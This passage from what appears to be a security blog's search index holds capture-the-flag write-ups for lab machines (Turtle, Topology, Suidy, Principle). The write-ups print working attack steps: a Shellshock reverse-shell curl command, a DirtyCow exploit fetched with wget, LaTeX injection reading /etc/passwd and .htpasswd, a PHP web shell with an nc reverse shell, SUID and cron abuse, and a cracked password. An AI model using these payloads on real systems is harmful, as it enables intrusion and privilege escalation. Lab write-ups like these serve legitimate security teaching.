(x86) D 0 Tue Feb 23 01:16:06 2021 ProgramData DHn 0 Fri Oct 6 16:03:44 2023 Recovery DHSn 0 Tue Feb 23 01:12:20 2021 System Volume Information DHS 0 Tue Feb 23 14:41:25 2021 Users DR 0 Wed Feb 24 03:32:40 2021 Windows D 0 Mon Mar 1 01:46:44 2021\t\t9558271 blocks of size 4096. 5140078 blocks availablesmb: \\> cd Users\\Administrator\\Desktopsmb: \\Users\\Administrator\\Desktop\\> dir . DR 0 Wed Feb 24 09:57:33 2021 .. DR 0 Wed Feb 24 09:57:33 2021 desktop.ini AHS 282 Tue Feb 23 03:25:21 2021 system.txt A 37 Wed Feb 24 09:57:45 2021\t\t9558271 blocks of size 4096. 5139822 blocks availablesmb: \\Users\\Administrator\\Desktop\\> get system.txtgetting file \\Users\\Administrator\\Desktop\\system.txt of size 37 as system.txt (0.0 KiloBytes/sec) (average 0.0 KiloBytes/sec)smb: \\Users\\Administrator\\Desktop\\>```{: .nolineno}Now I am the Administrator !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Turtle", "url": "/posts/Turtle/", "categories": "TryHackMe", "tags": "PrivEsc, ShellShock, sudo exploit", "date": "2023-10-10 00:00:00 +0530", "snippet": "## Port Scan Resutls â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/0day]â””â”€$ rustscan -t 5000 -a 10.10.106.27 --ulimit 5000.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {_...", "content": "## Port Scan Resutls â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/0day]â””â”€$ rustscan -t 5000 -a 10.10.106.27 --ulimit 5000.----. .-. .-. .----..---. .----. .---. .--. .-. .-.| {} }| { } |{ {__ {_ _}{ {__ / ___} / {} \\ | `| || .-. \\| {_} |.-._} } | | .-._} }\\ }/ /\\ \\| |\\ |`-' `-'`-----'`----' `-' `----' `---' `-' `-'`-' `-''The Modern Day Port Scanner.________________________________________: https://discord.gg/GFrQsGy :: https://github.com/RustScan/RustScan : --------------------------------------Real hackers hack time âŒ›[~] The config file is expected to be at \"/home/kali/.rustscan.toml\"[~] Automatically increasing ulimit value to 5000.Open 10.10.106.27:22Open 10.10.106.27:80[~] Starting Script(s)```{: .nolineno}## Web Enumeration â¤µï¸While doing directory or files bruteforcing I got some directories like this â†’```bash301 GET 9l 28w 313c http://10.10.106.27/cgi-bin => http://10.10.106.27/cgi-bin/301 GET 9l 28w 309c http://10.10.106.27/img => http://10.10.106.27/img/200 GET 7l 11w 156c http://10.10.106.27/js/main.js200 GET 78l 138w 1114c http://10.10.106.27/css/main.css301 GET 9l 28w 313c http://10.10.106.27/uploads => http://10.10.106.27/uploads/200 GET 423l 2430w 194997c http://10.10.106.27/img/avatar.png200 GET 42l 136w 3025c http://10.10.106.27/301 GET 9l 28w 311c http://10.10.106.27/admin => http://10.10.106.27/admin/301 GET 9l 28w 309c http://10.10.106.27/css => http://10.10.106.27/css/301 GET 9l 28w 308c http://10.10.106.27/js => http://10.10.106.27/js/301 GET 9l 28w 312c http://10.10.106.27/backup => http://10.10.106.27/backup/200 GET 1l 7w 38c http://10.10.106.27/robots.txt301 GET 9l 28w 312c http://10.10.106.27/secret => http://10.10.106.27/secret/```{: .nolineno}Now I tried the shellshock vulnerability and I got a hit like this â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/0day]â””â”€$ curl -A \"() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /usr/bin/id\" http://10.10.106.27/cgi-bin/test.cgiuid=33(www-data) gid=33(www-data) groups=33(www-data)```{: .nolineno}Now its time for the reverse shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/Tryhackme/0day]â””â”€$ curl -A \"() { ignored; }; echo Content-Type: text/plain ; echo ; echo ; /bin/bash -c 'bash -i >& /dev/tcp/10.8.83.156/4444 0>&1'\" http://10.10.106.27/cgi-bin/test.cgi```{: .nolineno}![Untitled](/Vulnhub-Files/img/Turtle/Untitled.png)## SSH SHELL â¤µï¸Now I directly checked its kernel version and it is way old â†’```bashwww-data@ubuntu:/$ uname -anuname -anLinux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linuxwww-data@ubuntu:/$```{: .nolineno}Now I will be using the dirtycow exploit over here for getting the root shell â†’```bashwww-data@ubuntu:/tmp$ wget http://10.8.83.156/exploit_64--2023-10-05 09:30:19-- http://10.8.83.156/exploit_64Connecting to 10.8.83.156:80... connected.HTTP request sent, awaiting response... 200 OKLength: 14368 (14K) [application/octet-stream]Saving to: 'exploit_64' 0% [ ] 0 --.-K100%[======================================>] 14,368 77.1KB/s in 0.2s 2023-10-05 09:30:19 (77.1 KB/s) - 'exploit_64' saved [14368/14368]www-data@ubuntu:/tmp$ chmod +x *www-data@ubuntu:/tmp$ ./exploit_64 /etc/passwd successfully backed up to /tmp/passwd.bakPlease enter the new password: Complete line:evait:fiw.I6FqpfXW.:0:0:pwned:/root:/bin/bashmmap: 7fecff9ea000# ididuid=0(root) gid=0(root) groups=0(root),33(www-data)# cat /root/root.txtcat /root/root.txtTHM{FLAG is}```{: .nolineno}I am Root Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Topology", "url": "/posts/Topology/", "categories": "HackTheBox", "tags": "LaTeX, subdomain, PrivEsc", "date": "2023-10-10 00:00:00 +0530", "snippet": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Topology]â””â”€$ cat Nmap_results.txt # Nmap 7.94 scan initiated Wed Oct 4 21:24:34 2023 as: nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10....", "content": "## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Topology]â””â”€$ cat Nmap_results.txt # Nmap 7.94 scan initiated Wed Oct 4 21:24:34 2023 as: nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.10.11.217Nmap scan report for 10.10.11.217Host is up (0.17s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 8.2p1 Ubuntu 4ubuntu0.7 (Ubuntu Linux; protocol 2.0)| ssh-hostkey: | 3072 dc:bc:32:86:e8:e8:45:78:10:bc:2b:5d:bf:0f:55:c6 (RSA)| 256 d9:f3:39:69:2c:6c:27:f1:a9:2d:50:6c:a7:9f:1c:33 (ECDSA)|_ 256 4c:a6:50:75:d0:93:4f:9c:4a:1b:89:0a:7a:27:08:d7 (ED25519)80/tcp open http Apache httpd 2.4.41 ((Ubuntu))|_http-title: Miskatonic University | Topology Group|_http-server-header: Apache/2.4.41 (Ubuntu)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸While checking port 80 I got the DNS name that is `topology.htb` and I searched for any subdomains and through source code I got one subdomain and rest from ffuf tool â†’![Untitled](/Vulnhub-Files/img/Topology/Untitled%201.png)form source code I got one â†’![Untitled](/Vulnhub-Files/img/Topology/Untitled%202.png)Now with tool called as `ffuf` I got 2 other subdomains â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Topology]â””â”€$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -H \"Host: FUZZ.topology.htb\" -u http://topology.htb -fs 6767 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ 'v2.1.0-dev________________________________________________ :: Method : GET :: URL : http://topology.htb :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt :: Header : Host: FUZZ.topology.htb :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 6767________________________________________________dev [Status: 401, Size: 463, Words: 42, Lines: 15, Duration: 1659ms]stats [Status: 200, Size: 108, Words: 5, Lines: 6, Duration: 852ms]:: Progress: [19966/19966] :: Job [1/1] :: 11 req/sec :: Duration: [0:24:26] :: Errors: 0 ::```{: .nolineno}Lets see the `latex.topology.htb` site first â†’![Untitled](/Vulnhub-Files/img/Topology/Untitled%203.png)I then searched for Latex Injection on web and I got some inputs like this â†’![Untitled](/Vulnhub-Files/img/Topology/Untitled%204.png)I used this one to get the output â†’```bash$\\lstinputlisting{/etc/passwd}$```{: .nolineno}![Untitled](/Vulnhub-Files/img/Topology/Untitled%205.png)Now as I got the `dev` subdomain so I think this site is `apache` based and could contains `.htpasswd` file so lets try to access this file â†’```bash$\\lstinputlisting{/var/www/dev/.htpasswd}$```{: .nolineno}and I got this â†’![Untitled](/Vulnhub-Files/img/Topology/Untitled%206.png)```bashvdaisley : $apr1$1ONUB/S2$58eeNVirnRDB5zAIbIxTY0```{: .nolineno}Now Lets crack this hash with hashcat Tool â†’![Untitled](/Vulnhub-Files/img/Topology/Untitled%207.png)```bashvdaisley : calculus20```{: .nolineno}## SSH SHELL â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HTB/Topology]â””â”€$ ssh vdaisley@topology.htbvdaisley@topology.htbs password: Welcome to Ubuntu 20.04.6 LTS (GNU/Linux 5.4.0-150-generic x86_64)Expanded Security Maintenance for Applications is not enabled.0 updates can be applied immediately.Enable ESM Apps to receive additional future security updates.See https://ubuntu.com/esm or run: sudo pro statusThe list of available updates is more than a week old.To check for new updates run: sudo apt updatevdaisley@topology:~$ whoamivdaisleyvdaisley@topology:~$ iduid=1007(vdaisley) gid=1007(vdaisley) groups=1007(vdaisley)vdaisley@topology:~$```{: .nolineno}Lets dig deeper for root access â†’I capture these data through pspy64 Tool that analyses the network pattern â†’![Untitled](/Vulnhub-Files/img/Topology/Untitled%208.png)I searched on web regarding this gnuplot and I get the info as â†’> ***gnuplot***Â is a command-line and GUI program that can generate two- and three-dimentional plots of functions, data, and data fits.{: .prompt-tip }and I also got an exploit related to it from [here](https://exploit-notes.hdks.org/exploit/linux/privilege-escalation/gnuplot-privilege-escalation/).In this case I created a file called as `test.plt` and executed the command to make `bash` have SUIDs permission , as the cron will execute on its own through root privileges so â†’```bashvdaisley@topology:/tmp$ nano /opt/gnuplot/test.pltvdaisley@topology:/tmp$ cat /opt/gnuplot/test.pltsystem \"chmod u+s /bin/bash\"vdaisley@topology:/tmp$ ls -al /bin/bash-rwsr-xr-x 1 root root 1183448 Apr 18 2022 /bin/bashvdaisley@topology:/tmp$ /bin/bash -pbash-5.0# whoamirootbash-5.0# iduid=1007(vdaisley) gid=1007(vdaisley) euid=0(root) groups=1007(vdaisley)bash-5.0# cd /rootbash-5.0# ls -altotal 28drwx------ 4 root root 4096 Jun 14 07:47 .drwxr-xr-x 18 root root 4096 Jun 12 10:37 ..lrwxrwxrwx 1 root root 9 Mar 13 2022 .bash_history -> /dev/null-rw-r--r-- 1 root root 3106 Jan 17 2023 .bashrcdrwx------ 3 root root 4096 Jan 17 2023 .configdrwxr-xr-x 3 root root 4096 May 12 07:34 .local-rw-r--r-- 1 root root 161 Jan 17 2023 .profile-rw-r----- 1 root root 33 Oct 4 14:00 root.txtbash-5.0#```{: .nolineno}I am Root Now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Suidy", "url": "/posts/Suidy/", "categories": "HackMyVM", "tags": "Fuzzing, Hid&Trial, PrivEsc, SUIDs", "date": "2023-10-10 00:00:00 +0530", "snippet": "## Description â¤µï¸This machine is *Suidy* , It is from HackMyVM Platform and categorized as Medium machine . ## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/Suidy/Untitled%201.png)```bashâ”Œâ”€â”€(k...", "content": "## Description â¤µï¸This machine is *Suidy* , It is from HackMyVM Platform and categorized as Medium machine . ## Port Scan Results â¤µï¸![Untitled](/Vulnhub-Files/img/Suidy/Untitled%201.png)```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Suidy]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.66Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-07 14:42 ISTNmap scan report for 10.0.2.66Host is up (0.00055s latency).Not shown: 65533 closed tcp ports (reset)PORT STATE SERVICE VERSION22/tcp open ssh OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)| ssh-hostkey: | 2048 8a:cb:7e:8a:72:82:84:9a:11:43:61:15:c1:e6:32:0b (RSA)| 256 7a:0e:b6:dd:8f:ee:a7:70:d9:b1:b5:6e:44:8f:c0:49 (ECDSA)|_ 256 80:18:e6:c7:01:0e:c6:6d:7d:f4:d2:9f:c9:d0:6f:4c (ED25519)80/tcp open http nginx 1.14.2|_http-title: Site doesnt have a title (text/html).|_http-server-header: nginx/1.14.2MAC Address: 08:00:27:42:7C:F8 (Oracle VirtualBox virtual NIC)Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel```{: .nolineno}## Web Enumeration â¤µï¸While checking port 80 I got this â†’![Untitled](/Vulnhub-Files/img/Suidy/Untitled%202.png)I did the directory or files bruteforcing and got only the `robots.txt` file â†’![Untitled](/Vulnhub-Files/img/Suidy/Untitled%203.png)I was stuck with these 2 outputs first , because they were invalid urls and after sometime I throught of scrolling down and I got this â†’![Untitled](/Vulnhub-Files/img/Suidy/Untitled%204.png)Now when I loaded this directory I got another instruction â†’![Untitled](/Vulnhub-Files/img/Suidy/Untitled%205.png)I used the ffuf Tool for File Traversal â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Suidy]â””â”€$ ffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt -u http://10.0.2.66/shehatesme/FUZZ -e txt /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ 'v2.1.0-dev________________________________________________ :: Method : GET :: URL : http://10.0.2.66/shehatesme/FUZZ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt :: Extensions : txt :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500________________________________________________index.html [Status: 200, Size: 229, Words: 39, Lines: 7, Duration: 21ms]. [Status: 301, Size: 185, Words: 6, Lines: 8, Duration: 8ms]search.txt [Status: 200, Size: 16, Words: 1, Lines: 2, Duration: 4ms]search.txt [Status: 200, Size: 16, Words: 1, Lines: 2, Duration: 9ms]admin.txt [Status: 200, Size: 16, Words: 1, Lines: 2, Duration: 130ms]privacy.txt [Status: 200, Size: 16, Words: 1, Lines: 2, Duration: 110ms]2001.txt [Status: 200, Size: 16, Words: 1, Lines: 2, Duration: 2ms]google.txt [Status: 200, Size: 16, Words: 1, Lines: 2, Duration: 4ms]:: Progress: [74100/74100] :: Job [1/1] :: 1538 req/sec :: Duration: [0:00:39] :: Errors: 2 ::```{: .nolineno}I got this credentials from all the txt files â†’![Untitled](/Vulnhub-Files/img/Suidy/Untitled%206.png)```bashjaime11/JKiufg6```{: .nolineno}I tried this above credentials but could not got the access so in the `/shehatesme` directory as example it was given for Login and I tried Hid & Trail method and I got in â†’creds used â†’```bashtheuser : thepass```{: .nolineno}## SSH Shell â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Suidy/ffuf]â””â”€$ ssh theuser@10.0.2.66 theuser@10.0.2.66s password: Linux suidy 4.19.0-9-amd64 #1 SMP Debian 4.19.118-2+deb10u1 (2020-06-07) x86_64The programs included with the Debian GNU/Linux system are free software;the exact distribution terms for each program are described in theindividual files in /usr/share/doc/*/copyright.Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extentpermitted by applicable law.Last login: Sun Sep 27 00:41:28 2020theuser@suidy:~$ whoamitheusertheuser@suidy:~$ iduid=1000(theuser) gid=1000(theuser) grupos=1000(theuser),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev)theuser@suidy:~$```{: .nolineno}Now I checked the behavior of this user with `pspy64` tool and this script is running as cron within few minutes â†’![Untitled](/Vulnhub-Files/img/Suidy/Untitled%207.png)Now I knew by looking at suidy directory that this file `suidyyyyy` is set SUIDs through that cron command â†’```bashtheuser@suidy:/home/suidy$ ls -altotal 56drwxr-xr-x 3 suidy suidy 4096 oct 7 12:16 .drwxr-xr-x 4 root root 4096 sep 26 2020 ..-rw-r--r-- 1 suidy theuser 20 oct 7 12:16 bash-rw------- 1 suidy suidy 12 sep 27 2020 .bash_history-rw-r--r-- 1 suidy suidy 220 sep 26 2020 .bash_logout-rw-r--r-- 1 suidy suidy 3526 sep 26 2020 .bashrcdrwxr-xr-x 3 suidy suidy 4096 sep 26 2020 .local-r--r----- 1 suidy suidy 197 sep 26 2020 note.txt-rw-r--r-- 1 suidy suidy 807 sep 26 2020 .profile-rwsrwsr-x 1 root theuser 16704 sep 26 2020 suidyyyyytheuser@suidy:/home/suidy$```{: .nolineno}Now I have the write permission so lets replace it with out own executable file like this â†’I created a bash executable simple file in c language named as `payload.c` file â†’```c//gcc payload.c -o payload#include #include int main(){ setuid(0);\tsetgid(0); system(\"/bin/bash\"); return 0;}```{: .nolineno}Now I transfered this file in victim machine as a user `theuser` â†’```bashtheuser@suidy:/tmp$ wget http://10.0.2.60/payload.c--2023-10-07 17:56:52-- http://10.0.2.60/payload.cConectando con 10.0.2.60:80... conectado.PeticiÃ³n HTTP enviada, esperando respuesta... 200 OKLongitud: 147 [text/x-csrc]Grabando a: â€œpayload.câ€payload.c 100%[=======================================================>] 147 --.-KB/s en 0s 2023-10-07 17:56:52 (15,5 MB/s) - â€œpayload.câ€ guardado [147/147]theuser@suidy:/tmp$ gcc payload.c -o suidyyyyypayload.c: In function â€˜mainâ€™:payload.c:8:5: warning: implicit declaration of function â€˜systemâ€™ [-Wimplicit-function-declaration] system(\"/bin/bash\"); ^~~~~~theuser@suidy:/tmp$ ls -altotal 56drwxrwxrwt 8 root root 4096 oct 7 17:57 .drwxr-xr-x 18 root root 4096 sep 26 2020 ..drwxrwxrwt 2 root root 4096 oct 7 17:47 .font-unixdrwxrwxrwt 2 root root 4096 oct 7 17:47 .ICE-unix-rw-r--r-- 1 theuser theuser 147 oct 7 17:47 payload.c-rwxr-xr-x 1 theuser theuser 16712 oct 7 17:57 suidyyyyydrwx------ 3 root root 4096 oct 7 17:47 systemd-private-1919423ef6c44c85a0c836d60673e669-systemd-timesyncd.service-4ZTpccdrwxrwxrwt 2 root root 4096 oct 7 17:47 .Test-unixdrwxrwxrwt 2 root root 4096 oct 7 17:47 .X11-unixdrwxrwxrwt 2 root root 4096 oct 7 17:47 .XIM-unixtheuser@suidy:/tmp$ mv suidyyyyy /home/suidy/suidyyyyymv: no se puede mover 'suidyyyyy' a '/home/suidy/suidyyyyy': Permiso denegado```{: .nolineno}I tried to move the executable to `/home/suidy/suidyyyyy` and it did not work so I tried to copy to that place and it worked as you can see its file size â†’```bashtheuser@suidy:/tmp$ cp suidyyyyy /home/suidy/suidyyyyytheuser@suidy:/tmp$ cd -/home/suidytheuser@suidy:/home/suidy$ ls -altotal 52drwxr-xr-x 3 suidy suidy 4096 sep 27 2020 .drwxr-xr-x 4 root root 4096 sep 26 2020 ..-rw------- 1 suidy suidy 12 sep 27 2020 .bash_history-rw-r--r-- 1 suidy suidy 220 sep 26 2020 .bash_logout-rw-r--r-- 1 suidy suidy 3526 sep 26 2020 .bashrcdrwxr-xr-x 3 suidy suidy 4096 sep 26 2020 .local-r--r----- 1 suidy suidy 197 sep 26 2020 note.txt-rw-r--r-- 1 suidy suidy 807 sep 26 2020 .profile-rwxrwxr-x 1 root theuser 16712 oct 7 17:58 suidyyyyytheuser@suidy:/home/suidy$```{: .nolineno}Now I waited for 20-30 sec and It got SUIDs permission so lets execute it now â†’```bashtheuser@suidy:/home/suidy$ ls -altotal 52drwxr-xr-x 3 suidy suidy 4096 sep 27 2020 .drwxr-xr-x 4 root root 4096 sep 26 2020 ..-rw------- 1 suidy suidy 12 sep 27 2020 .bash_history-rw-r--r-- 1 suidy suidy 220 sep 26 2020 .bash_logout-rw-r--r-- 1 suidy suidy 3526 sep 26 2020 .bashrcdrwxr-xr-x 3 suidy suidy 4096 sep 26 2020 .local-r--r----- 1 suidy suidy 197 sep 26 2020 note.txt-rw-r--r-- 1 suidy suidy 807 sep 26 2020 .profile-rwsrwsr-x 1 root theuser 16712 oct 7 17:58 suidyyyyytheuser@suidy:/home/suidy$ ./suidyyyyy root@suidy:/home/suidy# whoamirootroot@suidy:/home/suidy# iduid=0(root) gid=0(root) grupos=0(root),24(cdrom),25(floppy),29(audio),30(dip),44(video),46(plugdev),109(netdev),1000(theuser)root@suidy:/home/suidy# cd /rootroot@suidy:/root# ls -altotal 32drwx------ 3 root root 4096 sep 27 2020 .drwxr-xr-x 18 root root 4096 sep 26 2020 ..-rw------- 1 root root 44 sep 27 2020 .bash_historydrwxr-xr-x 3 root root 4096 sep 26 2020 .local-rw-r--r-- 1 root root 148 ago 17 2015 .profile-rw-r--r-- 1 root root 11 sep 27 2020 root.txt-rw-r--r-- 1 root root 66 sep 26 2020 .selected_editor-rwxr-xr-x 1 root root 42 sep 26 2020 timer.shroot@suidy:/root# cat root.txtFLAGFLAGFLAGroot@suidy:/root# cat timer.sh #!/bin/shchmod +s /home/suidy/suidyyyyyroot@suidy:/root#```{: .nolineno}I am the root now !!> If you have any questions or suggestions, please leave a comment below.Thank You ! {: .prompt-tip }" }, { "title": "Principle", "url": "/posts/Principle/", "categories": "HackMyVM", "tags": "Fuzzing, RFI, SSH keys, SUIDs, python, subdomain, PrivEsc", "date": "2023-10-10 00:00:00 +0530", "snippet": "## Description â¤µï¸This machine is *Principle* , It is from HackMyVM Platform and categorized as Medium machine . ## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Principle]â””â”€$ sudo...", "content": "## Description â¤µï¸This machine is *Principle* , It is from HackMyVM Platform and categorized as Medium machine . ## Port Scan Results â¤µï¸```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Principle]â””â”€$ sudo nmap -sC -sV -p- -T4 -oN Nmap_results.txt 10.0.2.72[sudo] password for kali: Starting Nmap 7.94 ( https://nmap.org ) at 2023-10-09 23:47 ISTNmap scan report for 10.0.2.72Host is up (0.0010s latency).Not shown: 65534 filtered tcp ports (no-response)PORT STATE SERVICE VERSION80/tcp open http nginx 1.22.1|_http-server-header: nginx/1.22.1|_http-title: Welcome to nginx!| http-robots.txt: 1 disallowed entry |_/hackmeMAC Address: 08:00:27:5A:FC:3E (Oracle VirtualBox virtual NIC)```{: .nolineno}## Web Enumeration â¤µï¸I found this page on port 80 â†’![Untitled](/Vulnhub-Files/img/Principle/Untitled%201.png)After directory or files bruteforcing I got some files like robots.txt also â†’![Untitled](/Vulnhub-Files/img/Principle/Untitled%202.png)Now from its souce code I got one hint â†’![Untitled](/Vulnhub-Files/img/Principle/Untitled%203.png)Now I started doing file search through ffuf tool and I got this file `rainbow_mystery.txt` â†’![Untitled](/Vulnhub-Files/img/Principle/Untitled%204.png)Lets decode it first â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Principle]â””â”€$ echo 'QWNjb3JkaW5nIHRvIHRoZSBPbGQgVGVzdGFtZW50LCB0aGUgcmFpbmJvdyB3YXMgY3JlYXRlZCBi eSBHb2QgYWZ0ZXIgdGhlIHVuaXZlcnNhbCBGbG9vZC4gSW4gdGhlIGJpYmxpY2FsIGFjY291bnQsIGl0IHdvdWxkIGFwcGVhciBhcyBhIHNpZ24gb2YgdGhlIGRpdmluZSB3aWxsIGFuZCB0byByZW1pbmQgbWVuIG9mIHRoZSBwcm9taXNlIG1hZGUgYnkgR29kIGhpbXNlbGYgdG8gTm9haCB0aGF0IGhlIHdvdWxkIG5ldmVyIGFnYWluIGRlc3Ryb3kgdGhlIGVhcnRoIHdpdGggYSBmbG9vZC4KTWF5YmUgdGhhdCdzIHdoeSBJIGFtIGEgcm9ib3Q/Ck1heWJlIHRoYXQgaXMgd2h5IEkgYW0gYWxvbmUgaW4gdGhpcyB3b3JsZD8KClRoZSBhbnN3ZXIgaXMgaGVyZToKLS4uIC0tLSAtLSAuLSAuLiAtLiAvIC0gLi4uLi0gLi0uLiAtLS0tLSAuLi4gLi0uLS4tIC4uLi4gLS0gLi4uLQo=' | base64 -dAccording to the Old Testament, the rainbow was created by God after the universal Flood. In the biblical account, it would appear as a sign of the divine will and to remind men of the promise made by God himself to Noah that he would never again destroy the earth with a flood.Maybe that is why I am a robot?Maybe that is why I am alone in this world?The answer is here:-.. --- -- .- .. -. / - ....- .-.. ----- ... .-.-.- .... -- ...-```{: .nolineno}Now with cyberchef Tool I get the morse code encoded text â†’![Untitled](/Vulnhub-Files/img/Principle/Untitled%205.png)I got this `DOMAIN / t4l0s.hmv` , now I set the hosts file and loaded the site with new domain name as `t4l0s.hmv` and I got this â†’![Untitled](/Vulnhub-Files/img/Principle/Untitled%206.png)Now I searched for subdomains again and I got hit â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Principle]â””â”€$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H \"Host: FUZZ.t4l0s.hmv\" -u http://t4l0s.hmv/ -fs 615 /'___\\ /'___\\ /'___\\ /\\ \\__/ /\\ \\__/ __ __ /\\ \\__/ \\ \\ ,__\\\\ \\ ,__\\/\\ \\/\\ \\ \\ \\ ,__\\ \\ \\ \\_/ \\ \\ \\_/\\ \\ \\_\\ \\ \\ \\ \\_/ \\ \\_\\ \\ \\_\\ \\ \\____/ \\ \\_\\ \\/_/ \\/_/ \\/___/ \\/_/ 'v2.1.0-dev________________________________________________ :: Method : GET :: URL : http://t4l0s.hmv/ :: Wordlist : FUZZ: /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-110000.txt :: Header : Host: FUZZ.t4l0s.hmv :: Follow redirects : false :: Calibration : false :: Timeout : 10 :: Threads : 40 :: Matcher : Response status: 200-299,301,302,307,401,403,405,500 :: Filter : Response size: 615________________________________________________hellfire [Status: 200, Size: 1659, Words: 688, Lines: 52, Duration: 26ms]:: Progress: [114441/114441] :: Job [1/1] :: 2597 req/sec :: Duration: [0:00:49] :: Errors: 0 ::```{: .nolineno}`hellfire.t4l0s.hmv` lets see â†’![Untitled](/Vulnhub-Files/img/Principle/Untitled%207.png)Now with directory or files bruteforcing on this domain I got upload.php page that takes input in image format only so lets upload our RFI payload with null byte to invade the image format issue â†’![Untitled](/Vulnhub-Files/img/Principle/Untitled%208.png)`upload.php` page looks like this â†’![Untitled](/Vulnhub-Files/img/Principle/Untitled%209.png)Now changed the uploaded file name to `.php` from `.php.gif` file â†’![Untitled](/Vulnhub-Files/img/Principle/Untitled%2010.png)the file was successfuly uploaded â†’![Untitled](/Vulnhub-Files/img/Principle/Untitled%2011.png)Now lets load this payload file now â†’```bashhttp://hellfire.t4l0s.hmv/archivos/command_shell.php?cmd=id```{: .nolineno}![Untitled](/Vulnhub-Files/img/Principle/Untitled%2012.png)Lets get reverse shell now â†’```bashhttp://hellfire.t4l0s.hmv/archivos/command_shell.php?cmd=nc%20-e%20/bin/bash%2010.0.2.60%204444```{: .nolineno}In response to that I got the reverse shell â†’```bashâ”Œâ”€â”€(kaliã‰¿kali)-[~/Downloads/HackMyVM/Principle]â””â”€$ nc -lvnp 4444listening on [any] 4444 ...connect to [10.0.2.60] from (UNKNOWN) [10.0.2.72] 52988python3 -c 'import pty;pty.spawn(\"/bin/bash\")'www-data@principle:~/hellfire.t4l0s.hmv/archivos$ whoamiwhoamiwww-datawww-data@principle:~/hellfire.t4l0s.hmv/archivos$ ididuid=33(www-data) gid=33(www-data) groups=33(www-data)www-data@principle:~/hellfire.t4l0s.hmv/archivos$```{: .nolineno}Lets dig deeper for root access â†’I found the SUIDs on `find` command â†’```bashbash-5.2$ find / -perm -u=s -type f 2>/dev/null/usr/lib/dbus-1.0/dbus-daemon-launch-helper/usr/lib/openssh/ssh-keysign/usr/bin/chfn/usr/bin/gpasswd/usr/bin/mount/usr/bin/passwd/usr/bin/sudo/usr/bin/find/usr/bin/su/usr/bin/bash/usr/bin/chsh/usr/bin/umount/usr/bin/newgrpbash-5.2$```{: .nolineno}Now I used this command and got the access to talos user directories â†’```bashbash-5.2$ find . -exec /bin/sh -p \\; -quit $ whoamitalos$ iduid=33(www-data) gid=33(www-data) euid=1000(talos) groups=33(www-data)$ cd /home/talos$ ls -altotal 44drwxr-xr-x 4 talos talos 4096 Oct 10 01:37 .drwxr-xr-x 4 root root 4096 Jul 4 06:11 ..-rw-r--r-- 1 talos talos 38 Oct 10 02:52 .bash_history-rw-r----- 1 talos talos 261 Jul 5 07:56 